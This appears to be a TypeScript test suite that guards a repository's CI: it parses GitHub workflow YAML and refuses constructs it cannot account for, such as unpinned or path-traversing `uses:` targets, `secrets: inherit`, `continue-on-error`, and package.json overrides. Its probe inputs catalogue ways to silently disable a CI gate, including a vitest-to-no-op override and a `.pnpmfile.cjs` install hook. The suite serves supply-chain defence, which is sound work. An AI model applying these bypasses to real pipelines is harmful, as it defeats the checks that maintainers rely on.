    // only how that is true on Linux. Those were the same sentence while every
    // job ran on `ubuntu-latest`, and the first Windows job made them different
    // — this guard failed it, correctly by its own words and wrongly on the
    // facts. `webkit2gtk` IS the Linux backend for the webview; `windows-latest`
    // ships WebView2 and has no package to install, so demanding the apt step
    // there demands a step that cannot exist.
    //
    // It now asks what the runner needs, and an unrecognised runner fails:
    // "I do not know what this machine has" should be a question, not a pass.
    // It also asks it of every job in the directory rather than of one file's.
    //
    // `usesCargo` reads the *program* of each simple command rather than
    // searching the job's text for the word. `cd src-tauri && cargo build` is
    // two commands and the second one's program is `cargo`; a job that merely
    // mentions cargo in a comment has no such command.
    for (const job of JOBS) {
      const name = `${job.file}:${job.name}`;
      const commands = job.commands.map(({ text }) => text);
      if (!commands.some((command) => parseCommand(command).program === 'cargo')) continue;

      expect(job.runsOn, `CI job "${name}" has no runs-on this test can read`).not.toBe('');

      if (job.runsOn.startsWith('ubuntu')) {
        expect(
          commands.some((command) => command.includes('libwebkit2gtk-4.1-dev')),
          `CI job "${name}" runs cargo on Linux but never installs the Tauri ` +
            'system dependencies. It will fail in a build script before linting ' +
            'or testing anything. Copy the "Install Tauri system dependencies" step.',
        ).toBe(true);
      } else if (job.runsOn.startsWith('windows') || job.runsOn.startsWith('macos')) {
        // Assert the absence of the Linux step as well. Copying it here would
        // fail on a runner with no apt, so its absence should read as a decision
        // rather than as something nobody got round to.
        expect(
          commands.some((command) => command.includes('apt-get')),
          `CI job "${name}" runs on ${job.runsOn} and installs Linux packages. The ` +
            'webview ships with the OS there; apt-get does not exist on it.',
        ).toBe(false);
      } else {
        expect.fail(
          `CI job "${name}" runs cargo on "${job.runsOn}", which this guard cannot ` +
            'reason about. Teach it what that runner provides before trusting a ' +
            'green run from it.',
        );
      }
    }
  });
});

/* -------------------------------------------------------------------------- */
/* which documents exist at all                                               */
/* -------------------------------------------------------------------------- */

describe('the documents this guard opens are the documents that are there', () => {
  /** A repository root with these files in it, and nothing else. */
  const withRoot = (files: Record<string, string>): string => {
    const root = mkdtempSync(join(tmpdir(), 'verify-root-'));
    for (const [name, text] of Object.entries(files)) writeFileSync(join(root, name), text, 'utf8');
    return root;
  };
  const surfaceOf =
    (files: Record<string, string>, patterns: readonly string[] = ROOT_IGNORED_PATTERNS) =>
    (): readonly string[] => {
      const root = withRoot(files);
      try {
        return readRootSurface(root, patterns);
      } finally {
        rmSync(root, { recursive: true, force: true });
      }
    };
  /** A `.gitignore` that satisfies the tie between the skip list and git. */
  const IGNORING_EVERYTHING = ROOT_IGNORED_PATTERNS.join('\n');

  it('every file at the repository root is one this guard has been shown', () => {
    // Defect twenty-two, and the assertion `SHELL_SETTING_FILES` could not make:
    // that list names three files to OPEN, so a fourth name is not refused, it
    // is invisible. A tracked `.pnpmfile.cjs` — a JavaScript body pnpm runs
    // during the one command SETUP_COMMANDS exempts by name — was
    // `181 passed (181)`, exit 0, twice, on the tree that shipped after round
    // four, while the byte-equivalent work written as a root `postinstall` was
    // red at *the setup exemption for "pnpm install" covers no work of its own*.
    expect(
      ROOT_SURFACE,
      'a file appeared at the top level of this repository that this guard has ' +
        'never been shown. The root is where a package manager finds work nobody ' +
        'wrote in a command — .npmrc, .pnpmfile.cjs, a lockfile, a manifest — so ' +
        'a new file here is a review, not a detail. Read it, decide what runs it ' +
        'and when, then add its name to ROOT_FILES.',
    ).toEqual([...ROOT_FILES]);

    // The rule, on input this tree does not have. Without these the assertion
    // above is satisfied by a reader that enumerates nothing.
    expect(surfaceOf({ '.gitignore': IGNORING_EVERYTHING, '.pnpmfile.cjs': 'module.exports = {};' })()).toEqual([
      '.gitignore',
      '.pnpmfile.cjs',
    ]);
    // A build output the working tree really grows is skipped, so the pin
    // survives a `tsc --build` — and the skip is tied to git rather than to this
    // file's say-so.
    expect(surfaceOf({ '.gitignore': IGNORING_EVERYTHING, 'tsconfig.tsbuildinfo': '{}' })()).toEqual([
      '.gitignore',
    ]);
    expect(surfaceOf({ '.gitignore': '*.log\n' })).toThrow('.gitignore does not carry that line');
    expect(surfaceOf({ '.gitignore': 'src/**\n' }, ['src/**'])).toThrow('not a spelling this reader implements');
  });

  it('the manifest is read whole, not for the one key this file wanted', () => {
    // Defect twenty-three. `package.json` was bound as `{ scripts }` and read
    // for `.scripts` at every use site, while the `pnpm` block four lines below
    // that object decides which dependency install scripts run — factor 3 of the
    // header's four, the one it calls closed. Adding `"overrides": { "vitest":
    // "npm:@vela/noop-vitest@1.0.0" }` beside the key already there was
    // `181 passed (181)`, exit 0, twice, on the tree that shipped after round
    // four.
    expect(MANIFEST_SETTINGS).toEqual(['onlyBuiltDependencies']);

    // The control: the real manifest satisfies the rule, which is exactly why
    // the rows below hand it manifests this tree does not contain.
    expect(() => refuseManifestKeys(MANIFEST)).not.toThrow();
    expect(refuseManifestKeys({ scripts: { verify: 'pnpm test' } })).toEqual([]);

    expect(() => refuseManifestKeys({ ...MANIFEST, packageManager: 'pnpm@10.33.0' })).toThrow(
      '"packageManager"',
    );
    expect(() =>
      refuseManifestKeys({
        ...MANIFEST,
        pnpm: { overrides: { vitest: 'npm:@vela/noop-vitest@1.0.0' }, onlyBuiltDependencies: ['esbuild'] },
      }),
    ).toThrow('"overrides"');
    expect(() =>
      refuseManifestKeys({ ...MANIFEST, pnpm: { onlyBuiltDependencies: ['esbuild', 'better-sqlite3'] } }),
    ).toThrow('onlyBuiltDependencies');
    expect(() => refuseManifestKeys({ ...MANIFEST, scripts: { verify: 42 } })).toThrow(
      'other than a command string',
    );
  });

  it('every gate CI has is one it runs on the events this claim assumes', () => {
    // Defect twenty-five. `on:` decides whether any of the thirteen rows above
    // ever runs, and it was a key listed as known and read by nothing.
    expect(
      Object.fromEntries(SURFACE.models.map((model) => [model.file, model.triggers])),
      'the events a workflow under .github/workflows/ runs on have changed. Every ' +
        'other assertion in this file is of the form "CI runs X, so verify must ' +
        'reach X" — none of them asks whether CI runs at all, and a trigger ' +
        'filtered down to nothing satisfies all of them against a CI that never ' +
        'starts. Read the change, then write it into CI_TRIGGERS.',
    ).toEqual(CI_TRIGGERS);
  });
});

/* -------------------------------------------------------------------------- */
/* the workflow, read as YAML                                                 */
/* -------------------------------------------------------------------------- */

describe('the workflow is read as a document, not as lines', () => {
  // `readWorkflowSurface` runs this same reader over every real workflow at
  // module load, so a refusal that misfires takes the whole file down and the
  // tests above never run. That is the control for every "refuses" row here.

  /** A one-job workflow carrying whatever step lines a case wants to try. */
  const probeText = (...stepLines: readonly string[]): string =>
    ['jobs:', '  probe:', '    runs-on: ubuntu-latest', '    steps:', ...stepLines].join('\n');

  /**
   * What a probe's enumeration is taken to have read: the probe file itself, and
   * nothing else.
   *
   * Every `uses:` case below is really a question about this set. A target that
   * lands in it is a file whose jobs are in the model; a target that does not is
   * a file nobody read, whatever it looks like. A second, plausible-looking
   * workflow name is deliberately absent from the set — before defect eleven a
   * name like that was admitted on its spelling alone.
   */
  const PROBE_READ_WORKFLOWS: ReadonlySet<string> = new Set(['.github/workflows/probe.yml']);

  function probe(...stepLines: readonly string[]): () => WorkflowModel {
    return () => modelOf({ file: 'probe.yml', text: probeText(...stepLines) }, PROBE_READ_WORKFLOWS);
  }

  /** The same one-job workflow with a top-level `defaults:` block in front. */
  function withDefaults(
    defaultsLines: readonly string[],
    ...stepLines: readonly string[]
  ): () => WorkflowModel {
    const text = ['defaults:', ...defaultsLines, probeText(...stepLines)].join('\n');
    return () => modelOf({ file: 'probe.yml', text }, PROBE_READ_WORKFLOWS);
  }

  /**
   * What the YAML parser resolved the first step's `uses:` to — read off the
   * tree, *before* any refusal.
   *
   * Deliberately not `modelOf(...).jobs[0].steps[0].uses`: the refusing cases
   * throw, and "it threw" is also what a reader that understood nothing would
   * report. Asserting the resolved string separately is what makes the eight
   * spellings a test of the parse rather than eight copies of one refusal arm.
   */
  function usesTargetOf(...stepLines: readonly string[]): string | undefined {
    const root = parseWorkflowYaml('probe.yml', probeText(...stepLines));
    const jobs = root.kind === 'mapping' ? entry(root.entries, 'jobs') : undefined;
    const job = jobs !== undefined && jobs.kind === 'mapping' ? jobs.entries[0]?.value : undefined;
    const steps = job !== undefined && job.kind === 'mapping' ? entry(job.entries, 'steps') : undefined;
    const first = steps !== undefined && steps.kind === 'sequence' ? steps.items[0] : undefined;
    return first !== undefined && first.kind === 'mapping'
      ? scalarOf(entry(first.entries, 'uses'))
      : undefined;
  }

  describe('a key is a key whatever its quoting — defect four', () => {
    it.each([
      { spelling: 'bare', key: 'run' },
      { spelling: 'double-quoted', key: '"run"' },
      { spelling: 'single-quoted', key: "'run'" },
    ])('reads a $spelling run: key', ({ key }) => {
      // The whole of defect four. Every fix before this one hardened how the
      // VALUE may be written; the KEY was never a variable, and two double-quote
      // characters were the difference between a module-load refusal and 42/42
      // green. A YAML parser has no such notion: it unquotes the key and hands
      // back `run`.
      const model = probe(`      - ${key}: pnpm probe-unlisted-gate`)();
      expect(model.jobs[0]?.steps[0]?.run).toBe('pnpm probe-unlisted-gate');
    });

    it.each([
      { spelling: 'bare', key: 'uses' },
      { spelling: 'double-quoted', key: '"uses"' },
      { spelling: 'single-quoted', key: "'uses'" },
    ])('refuses a composite action behind a $spelling uses: key', ({ key }) => {
      expect(probe(`      - ${key}: ./.github/actions/probe-composite`)).toThrow(
        'has a "uses:" this reader cannot place: "./.github/actions/probe-composite"',
      );
    });

    it('refuses a step written as a flow mapping', () => {
      // The second spelling of the same frame, and the one a line reader misses
      // for the same reason: `- { run: … }` has no line that begins `run:`. It
      // is refused rather than parsed, because this reader does not implement
      // flow mappings and the alternative to refusing is to skip it in silence.
      expect(probe('      - { run: pnpm probe-unlisted-gate }')).toThrow(
        'a flow mapping',
      );
    });
  });

  describe('a uses: is refused on what it names, not on how it is written', () => {
    it.each([
      { spelling: 'unquoted', written: ['      - uses: ./.github/actions/foo'] },
      { spelling: 'double-quoted', written: ['      - uses: "./.github/actions/foo"'] },
      { spelling: 'single-quoted', written: ["      - uses: './.github/actions/foo'"] },
      {
        spelling: 'double-quoted with a trailing comment',
        written: ['      - uses: "./.github/actions/foo" # bundle'],
      },
      {
        spelling: 'unquoted with a trailing comment',
        written: ['      - uses: ./.github/actions/foo # bundle'],
      },
      {
        spelling: 'a plain scalar continued on the next line',
        written: ['      - uses:', '          ./.github/actions/foo'],
      },
      {
        spelling: 'a folded block scalar',
        written: ['      - uses: >-', '          ./.github/actions/foo'],
      },
      {
        spelling: 'a literal block scalar',
        written: ['      - uses: |-', '          ./.github/actions/foo'],
      },
    ])('resolves and refuses a composite action written as $spelling', ({ written }) => {
      // Defects two and three, and the promise the old header made but could not
      // keep. The off-the-line spellings used to be refused for the *wrong*
      // reason — "this reader cannot see the value" — which is the right verdict
      // from a line reader and a worse one than the truth. A YAML parser
      // resolves all eight of these to one string, so they now refuse on what
      // they name, and the parse is asserted rather than inferred from a throw.
      expect(usesTargetOf(...written)).toBe('./.github/actions/foo');
      expect(probe(...written)).toThrow(
        'has a "uses:" this reader cannot place: "./.github/actions/foo"',
      );
    });

    it('refuses a composite action reached by a parent-relative path', () => {
      // `../` is not how GitHub spells a reference into this repository, and it
      // is not an `owner/repo@ref` either, so this reader has no reading of it
      // to trust. It says so instead of picking one.
      expect(probe("      - uses: '../actions/foo'")).toThrow(
        'has a "uses:" this reader cannot place: "../actions/foo"',
      );
    });

    it.each([
      { spelling: 'unquoted', written: 'org/repo/.github/workflows/x.yml@main' },
      { spelling: 'double-quoted', written: '"org/repo/.github/workflows/x.yml@main"' },
      { spelling: 'single-quoted', written: "'org/repo/.github/workflows/x.yml@main'" },
    ])('refuses a remote reusable workflow written $spelling', ({ written }) => {
      expect(probe(`      - uses: ${written}`)).toThrow(
        'calls "org/repo/.github/workflows/x.yml@main", a reusable workflow in another repository',
      );
    });

    it('refuses a remote reusable workflow called at job level', () => {
      // A job may be a `uses:` with no steps at all. The old line reader saw
      // the key wherever it sat, which was right by accident; this one has to
      // look for it on purpose, so the case is pinned.
      const text = ['jobs:', '  probe:', '    uses: org/repo/.github/workflows/x.yml@main'].join('\n');
      expect(() => modelOf({ file: 'probe.yml', text }, PROBE_READ_WORKFLOWS)).toThrow(
        'calls "org/repo/.github/workflows/x.yml@main", a reusable workflow in another repository',
      );
    });

    it.each([
      { spelling: 'unquoted', written: './.github/workflows/probe.yml', names: './.github/workflows/probe.yml' },
      { spelling: 'double-quoted', written: '"./.github/workflows/probe.yml"', names: './.github/workflows/probe.yml' },
      { spelling: 'single-quoted', written: "'./.github/workflows/probe.yml'", names: './.github/workflows/probe.yml' },
    ])('reads a local reusable workflow written $spelling and allows it', ({ written, names }) => {
      // Two assertions, because "it did not throw" on its own is also what a
      // reader that understood nothing would report. The first says what was
      // read; the second says the admission is a decision.
      //
      // The target is the probe's own file and not some second, plausible name,
      // for the whole of defect eleven: the admission is now a membership test
      // against the files this run enumerated, and PROBE_READ_WORKFLOWS holds
      // exactly one. The case below feeds it a target spelled identically and
      // absent from that set.
      expect(usesTargetOf(`      - uses: ${written}`)).toBe(names);
      expect(
        probe(`      - uses: ${written}`),
        'a local reusable workflow that the enumeration read is a file whose ' +
          'jobs are already in JOBS under its own name.',
      ).not.toThrow();
    });

    it('refuses a local reusable workflow the enumeration never read — defect eleven', () => {
      // The control for the row above, and the reason that row is not simply
      // "./ paths ending .yml are fine". Same directory, same extension, same
      // spelling; the only difference is that no such file was enumerated, so
      // nothing here has read its jobs.
      expect(probe('      - uses: ./.github/workflows/reusable.yml')).toThrow(
        'has a "uses:" this reader cannot place: "./.github/workflows/reusable.yml"',
      );
    });

    it.each([
      {
        shape: 'a parent hop back out of the workflows directory',
        written: './.github/workflows/../actions/probe-composite/action.yml',
        resolves: '.github/actions/probe-composite/action.yml',
      },
      {
        shape: 'two parent hops, landing outside .github entirely',
        written: './.github/workflows/../../shared-ci/gates.yml',
        resolves: 'shared-ci/gates.yml',
      },
      {
        shape: 'a dot segment in the middle',
        written: './.github/workflows/./reusable.yml',
        resolves: '.github/workflows/reusable.yml',
      },
    ])('resolves $shape before deciding — defect eleven', ({ written, resolves }) => {
      // Each of these was 117/117 green before this fix, measured twice each on
      // the tree carrying the fixes for seven to ten, and not by missing the old
      // reader's patterns: each one *matched* them. The old arm tested the
      // unresolved bytes, so anything beginning `./.github/workflows/` and
      // ending `.yml` was returned as a local reusable workflow — including
      // these three, none of which names a file in that directory. The message
      // names the resolved path, so the case asserts that the resolution
      // happened rather than only that something threw.
      expect(probe(`      - uses: ${written}`)).toThrow(
        `has a "uses:" this reader cannot place: "${written}", which as a path resolves to "${resolves}"`,
      );
    });

    it('refuses a uses: padded with whitespace rather than trimming it — defect eleven', () => {
      // One leading space, inside double quotes so the YAML parser keeps it, was
      // enough to walk past every prefix test in the old reader. Trimming would
      // be this file deciding what the runner does with the space.
      expect(usesTargetOf('      - uses: " ./.github/actions/probe-composite"')).toBe(
        ' ./.github/actions/probe-composite',
      );
      expect(probe('      - uses: " ./.github/actions/probe-composite"')).toThrow(
        'has a "uses:" padded with whitespace',
      );
    });

    it.each([
      { shape: 'a repository path with no leading ./', written: '.github/actions/probe-composite' },
      { shape: 'a bare directory name', written: 'probe-composite' },
      { shape: 'an owner and repo with no ref', written: 'some-org/probe-composite' },
      { shape: 'a docker image', written: 'docker://alpine:3.19' },
      { shape: 'a ref with nothing in front of it', written: '@v4' },
      { shape: 'an owner beginning with a dot', written: '.github/actions/probe@v1' },
    ])('refuses $shape, which it cannot place — defect eleven', ({ written }) => {
      // The default is refusal. Before this fix every one of these fell off the
      // end of `refuseUses` and was silently classified as a third-party action;
      // `.github/actions/probe-composite` was measured 117/117 green twice. Some
      // of these the runner may well reject outright — that costs a review, and
      // the alternative costs a gate.
      expect(probe(`      - uses: ${written}`)).toThrow('this reader cannot place');
    });

    it.each([
      { shape: 'a dot segment', written: './.github/workflows/./probe.yml' },
      { shape: 'a trailing slash', written: './.github/workflows/probe.yml/' },
      { shape: 'a doubled separator', written: './.github/workflows//probe.yml' },
      { shape: 'a hop out and back', written: './.github/workflows/../workflows/probe.yml' },
    ])('refuses $shape onto a file it did read, rather than picking a reading', ({ written }) => {
      // The other half of the membership test. All four normalise onto the
      // probe's own file, which IS in PROBE_READ_WORKFLOWS, so the set alone
      // would admit every one of them; the admission also requires the bytes to
      // be the plain path to that file.
      // Refusing costs whoever writes one of these a review. Admitting one costs
      // whatever the runner does with a spelling this reader guessed at.
      expect(probe(`      - uses: ${written}`)).toThrow(
        'a file this run did read, but not written as the plain path to it',
      );
    });

    it.each([
      {
        level: 'step',
        lines: ['      - uses:', '          repository: probe/composite'],
        message: 'has a "uses:" that is not one value this reader can resolve',
      },
    ])('refuses a $level uses: whose value is not one scalar', ({ lines, message }) => {
      expect(probe(...lines)).toThrow(message);
    });

    it('refuses a job whose uses: is not one scalar, instead of dropping it', () => {
      // At job level this one had a silent reading: `scalarOf` returns undefined
      // for a mapping, which was indistinguishable from "this job has no uses:",
      // so a job carrying both was modelled as an ordinary steps job with the
      // `uses:` gone. The same class as everything else here — a value it could
      // not take apart, skipped rather than named.
      const text = [
        'jobs:',
        '  probe:',
        '    uses:',
        '      repository: probe/composite',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: pnpm typecheck',
      ].join('\n');
      expect(() => modelOf({ file: 'probe.yml', text }, PROBE_READ_WORKFLOWS)).toThrow(
        'with a "uses:" that is not one value this reader can resolve',
      );
    });

    it('refuses a job-level uses: that resolves outside the workflows directory — defect eleven', () => {
      // The job-level arm, which is where a whole reusable workflow is imported
      // and where the escape brought in jobs contributing no commands at all.
      const text = [
        'jobs:',
        '  probe:',
        '    uses: ./.github/workflows/../../shared-ci/gates.yml',
        '    secrets: inherit',
      ].join('\n');
      expect(() => modelOf({ file: 'probe.yml', text }, PROBE_READ_WORKFLOWS)).toThrow(
        'resolves to "shared-ci/gates.yml"',
      );
    });

    it.each([
      { shape: 'a segment that is a parent hop', written: 'some-org/../probe/action@v1' },
      { shape: 'a segment that is a dot', written: 'some-org/./action@v1' },
      { shape: 'an empty ref', written: 'some-org/action@' },
      { shape: 'whitespace inside the ref', written: '"some-org/action@v1 v2"' },
    ])('refuses $shape rather than reading it as a third-party action', ({ written }) => {
      // `isThirdPartyAction` is checked segment by segment because it decides
      // which targets get as far as the pin at all. It is no longer "the size
      // of the hole" — that sentence was in the round-two header and defect
      // sixteen measured it false — because a target it accepts must also be
      // one of the five in THIRD_PARTY_ACTIONS. These four are refused here,
      // before the pin, and with a message about what they are rather than
      // about what nobody listed.
      expect(probe(`      - uses: ${written}`)).toThrow('this reader cannot place');
    });

    it.each([
      { spelling: 'alone', written: '${{ env.PROBE_ACTION }}' },
      { spelling: 'as a prefix', written: '${{ env.OWNER }}/action@v1' },
      { spelling: 'inside a quoted value', written: '"${{ matrix.action }}"' },
    ])('refuses a uses: whose target is an expression written $spelling — defect eight', ({ written }) => {
      // `run:` has refused an expression since defect four. `uses:` did not, so
      // the identical unreadable value was refused in one key and admitted in
      // the other, and the arms below it decided a target nobody had read.
      //
      // Two assertions again: the first says the parse resolved the value to the
      // expression text, so the refusal is about what it names and not about a
      // spelling the reader failed to take apart.
      expect(usesTargetOf(`      - uses: ${written}`)).toContain('${{');
      expect(probe(`      - uses: ${written}`)).toThrow('is a GitHub expression');
    });

    it('refuses a relative path into the workflows directory that is not a workflow', () => {
      // It lands in the right directory and is still not a file the enumeration
      // read, which is now the only question asked of it.
      expect(probe('      - uses: "./.github/workflows/helper.sh"')).toThrow(
        'has a "uses:" this reader cannot place: "./.github/workflows/helper.sh"',
      );
    });

    it('refuses a uses: whose opening quote never closes', () => {
      // Unquoted this exact target is *allowed* — it is the local reusable
      // workflow above, and it is in `PROBE_READ_WORKFLOWS` — so neither guess
      // is safe.
      expect(probe('      - uses: "./.github/workflows/probe.yml')).toThrow(
        'quote never closes',
      );
    });

    it.each([
      { spelling: 'unquoted', written: 'actions/checkout@v4', names: 'actions/checkout@v4' },
      { spelling: 'double-quoted', written: '"pnpm/action-setup@v4"', names: 'pnpm/action-setup@v4' },
      { spelling: 'single-quoted', written: "'dtolnay/rust-toolchain@stable'", names: 'dtolnay/rust-toolchain@stable' },
      { spelling: 'unquoted with a trailing comment', written: 'Swatinem/rust-cache@v2 # cache', names: 'Swatinem/rust-cache@v2' },
    ])('reads a third-party action written $spelling and allows it', ({ written, names }) => {
      // The refusal is the default and the *admission* is two named shapes, one
      // of which is this: enumerating what a third-party action runs is neither
      // this file's business nor within its reach, and every workflow in this
      // directory is full of them. That direction was reversed by defect eleven,
      // where the default was admission and refusal was the enumerated case.
      // Narrowing this arm until it stops covering these is caught by `ci.yml`
      // itself at module load, so the arm cannot quietly close either.
      expect(usesTargetOf(`      - uses: ${written}`)).toBe(names);
      expect(probe(`      - uses: ${written}`)).not.toThrow();
    });

    it('refuses a well-formed third-party action nobody pinned — defect sixteen', () => {
      // The control for the row above, and the whole of the pin. This target is
      // as well-formed as `actions/checkout@v4` and passes `isThirdPartyAction`
      // segment by segment; the difference is that nobody has said what it is or
      // what this repository hands it.
      expect(isThirdPartyAction('actions/github-script@v7')).toBe(true);
      expect(probe('      - uses: actions/github-script@v7')).toThrow(
        'an action in another repository that this guard has never been told about',
      );
    });

    it.each([
      { spelling: 'lower-case', written: 'org/repo/.github/workflows/x.yml@main' },
      { spelling: 'upper-case', written: 'org/repo/.github/workflows/x.YML@main' },
      { spelling: 'mixed-case', written: 'org/repo/.github/workflows/x.YaMl@main' },
    ])('refuses a remote reusable workflow whose extension is $spelling — round two', ({ written }) => {
      // Round two's second finding. With `/\.ya?ml@/u` the upper-case spelling
      // reached `isThirdPartyAction` and was admitted on the tree that shipped
      // after round two — 141/141 green, twice —
      // while the byte-identical target spelled `.yml@` was red twice. One
      // referent, two spellings, opposite verdicts, inside the function the
      // round-two commit says it converted from spelling to fact.
      expect(probe(`      - uses: ${written}`)).toThrow('a reusable workflow in another repository');
    });

    it('refuses a with: handed to an action whose inputs nobody listed — defect sixteen', () => {
      // `actions/checkout@v4` is pinned and takes no inputs here. The key is
      // consumed by the parser either way, which is exactly why the totality
      // claim held textually while this went unread.
      expect(probe('      - uses: actions/checkout@v4', '        with:', '          fetch-depth: 0')).toThrow(
        'hands "actions/checkout@v4" an input this guard has not been told about: "fetch-depth"',
      );
    });

    it('reads a with: whose keys the pin lists', () => {
      // The control, without which the row above passes for a reader that
      // refuses every `with:` and would be red on `ci.yml` itself at module
      // load. (It would be — `pnpm/action-setup@v4` carries `version: 10` in
      // three jobs.)
      expect(
        probe('      - uses: pnpm/action-setup@v4', '        with:', '          version: 10'),
      ).not.toThrow();
    });

    it('refuses a with: that names no target this reader has read', () => {
      // A `with:` on a `run:` step, which the runner would reject and which this
      // reader used to consume in silence.
      expect(probe('      - run: pnpm test', '        with:', '          script: pnpm probe')).toThrow(
        'has a "with:" this reader cannot attach to anything it has read',
      );
    });

    it('an env: on a uses: step is the with: pin written the other way — defect twenty-one', () => {
      // Defect twenty-one. GitHub hands a `with:` input to an action as the
      // environment variable INPUT_<NAME>, so this is one channel with two
      // spellings and the pin read one of them. Measured on the tree that
      // shipped after round three, twice: `env: INPUT_RUN_INSTALL:` on the
      // pinned `pnpm/action-setup@v4` step of `static` was `172 passed (172)`,
      // exit 0, while the byte-equivalent `with: run_install:` on the identical
      // step took that file down at module load, exit 1 twice, by name.
      //
      // Whether the runner really consumes it that way was NOT established here,
      // and the refusal does not turn on it: the reader has no fact either way,
      // and the header's rule for that case is a refusal rather than a guess in
      // the quiet direction.
      expect(
        probe(
          '      - uses: pnpm/action-setup@v4',
          '        env:',
          '          INPUT_RUN_INSTALL: --frozen-lockfile',
          '        with:',
          '          version: 10',
        ),
      ).toThrow('spelled the other way: INPUT_RUN_INSTALL');

      // Not a list of one prefix: any `env:` on a `uses:` step is refused, for
      // the reason VERIFY_INVOCATIONS gives for being an allowlist.
      expect(probe('      - uses: actions/checkout@v4', '        env:', '          ANYTHING: 1')).toThrow(
        'sets "env:" on a step whose work is "actions/checkout@v4"',
      );

      // The control, and it is the boundary this refusal is drawn at: `env:` on
      // a `run:` step is untouched, because that step's text is compared with
      // CI_GATES by equality and the header discloses what an `env:` can still
      // do to it. Without this row the two above pass for a reader that refuses
      // every `env:`.
      expect(probe('      - run: pnpm test', '        env:', '          ANYTHING: 1')).not.toThrow();
    });

    it('refuses a job-level secrets:, instead of listing it as known and reading nothing', () => {
      const text = [
        'jobs:',
        '  probe:',
        '    uses: ./.github/workflows/probe.yml',
        '    secrets: inherit',
      ].join('\n');
      expect(() => modelOf({ file: 'probe.yml', text }, PROBE_READ_WORKFLOWS)).toThrow(
        'with a "secrets:", which hands credentials to whatever it calls',
      );
    });
  });

  describe('a construct it cannot take apart is refused, never skipped', () => {
    // The general form of defect four. Every escape so far has been a spelling
    // nobody thought of, so the rule is no longer "recognise these spellings"
    // but "account for everything, and name what you cannot".

    it('marks a workflow command whose failure a shell operator swallows — defect ten', () => {
      // `modelOf` computed this flag and a `.map(c => c.text)` threw it away, so
      // a step could suppress its own gate and every row above went on claiming
      // CI ran it. Asserted on the model rather than only through `ci.yml`,
      // because `ci.yml` contains no such step and never will if this holds.
      expect(probe('      - run: pnpm test:harness || pnpm test:harness')().jobs[0]?.commands).toEqual([
        { text: 'pnpm test:harness', gating: false, reached: true },
        { text: 'pnpm test:harness', gating: true, reached: false },
      ]);

      // The control: the same step without the operator. Without it the row
      // above passes for a reader that calls everything non-gating.
      expect(probe('      - run: pnpm test:harness')().jobs[0]?.commands).toEqual([
        { text: 'pnpm test:harness', gating: true, reached: true },
      ]);
    });

    it('carries the gating flag from the parsed step into the command list', () => {
      // The step above proves `modelOf` computes the flag; the cases for
      // `unenforcedGates` prove the rule reads it. Neither says the flag survives
      // the trip between them, and that trip is where defect ten actually lived.
      // Measured on the tree that carried the fix for defect ten, whose whole
      // suite was 116: reintroducing the drop here was 116/116 green with both of
      // those in place.
      expect(commandsOf(probe('      - run: pnpm test:harness || pnpm test:harness')().jobs)).toEqual([
        { file: 'probe.yml', job: 'probe', command: 'pnpm test:harness', gating: false, reached: true },
        { file: 'probe.yml', job: 'probe', command: 'pnpm test:harness', gating: true, reached: false },
      ]);
    });

    it('refuses a step key it does not know how to reason about', () => {
      expect(probe('      - run: pnpm test', '        surprise: yes')).toThrow(
        'has a step key this reader does not know: "surprise"',
      );
    });

    it('refuses a job key it does not know how to reason about', () => {
      const text = ['jobs:', '  probe:', '    runs-on: ubuntu-latest', '    surprise: yes'].join('\n');
      expect(() => modelOf({ file: 'probe.yml', text }, PROBE_READ_WORKFLOWS)).toThrow(
        'has a job key this reader does not know: "surprise"',
      );
    });

    it('refuses a step that is neither a run: nor a uses:', () => {
      expect(probe('      - name: nothing at all')).toThrow(
        'is a step with neither a "run:" nor a "uses:"',
      );
    });

    it('refuses a step that is both a run: and a uses:', () => {
      expect(probe('      - run: pnpm test', '        uses: actions/checkout@v4')).toThrow(
        'is a step with both a "run:" and a "uses:"',
      );
    });

    it('refuses a run: whose shell is not one this reader can split', () => {
      // `shell: python` means the body is not shell at all, so every `&&` and
      // `;` this reader relies on means nothing there.
      expect(probe('      - run: print("hi")', '        shell: python')).toThrow(
        'runs under "shell: python"',
      );
    });

    it('refuses the same shell set as a workflow default — defect nine', () => {
      // The step spells out no shell at all. The refusal above asked whether
      // *this step* declared one it could not split; the question is what shell
      // the step actually runs under, and a workflow default answers it just as
      // completely. Listing `defaults` in TOP_LEVEL_KEYS and never reading it
      // was 91/91 green with these three lines in the file.
      expect(
        withDefaults(['  run:', '    shell: python'], '      - run: print("hi")'),
      ).toThrow('runs under "shell: python", set as the workflow default,');
    });

    it('lets a step override a workflow default with a shell it can split', () => {
      // Without this the case above passes for a reader that refuses any file
      // carrying a `defaults:` at all.
      expect(
        withDefaults(['  run:', '    shell: python'], '      - run: pnpm test', '        shell: bash'),
      ).not.toThrow();
    });

    it('refuses a defaults: key it does not know how to reason about', () => {
      // Same rule as jobs and steps, in the one place it was not applied. A
      // default reaches every step in the file.
      expect(withDefaults(['  surprise: yes'], '      - run: pnpm test')).toThrow(
        'has a "defaults:" key this reader does not know: "surprise"',
      );
      expect(
        withDefaults(['  run:', '    surprise: yes'], '      - run: pnpm test'),
      ).toThrow('has a "defaults.run:" key this reader does not know: "surprise"');
    });

    it('reads a defaults.run it does understand without refusing', () => {
      expect(
        withDefaults(['  run:', '    working-directory: src-tauri'], '      - run: pnpm test'),
      ).not.toThrow();
    });

    it('refuses a run: whose value is a GitHub expression', () => {
      // `run: ${{ matrix.command }}` is a gate whose text is not in the file.
      expect(probe('      - run: ${{ matrix.command }}')).toThrow(
        'is not a command this reader can see',
      );
    });

    it.each([
      { spelling: 'true' },
      { spelling: 'True' },
      { spelling: 'TRUE' },
    ])('refuses a step whose failure does not fail the job, written $spelling', ({ spelling }) => {
      // Defect fourteen. The refusal used to be `scalarOf(...) === 'true'`, an
      // exact byte comparison against one of the three spellings YAML 1.2's core
      // schema resolves to boolean true — so `continue-on-error: True` on the
      // `Typecheck` step of `static` was 141/141 green, twice, while the same
      // step spelled `true` was red twice at module load. One key, one value,
      // two spellings, opposite verdicts, inside the refusal this file argues
      // hardest for. The old hand-set case planted only the lowercase spelling,
      // which is what let the case pin the bytes rather than the meaning.
      expect(probe('      - run: pnpm test', `        continue-on-error: ${spelling}`)).toThrow(
        'cannot fail the job',
      );
    });

    it.each([
      { spelling: 'false' },
      { spelling: 'False' },
      { spelling: 'FALSE' },
    ])('reads $spelling as a step that does still gate', ({ spelling }) => {
      // The control, and it has to be all three too: a resolver that answered
      // "true" to every spelling would pass the case above and refuse the whole
      // of `ci.yml` if anyone wrote this.
      expect(probe('      - run: pnpm test', `        continue-on-error: ${spelling}`)).not.toThrow();
    });

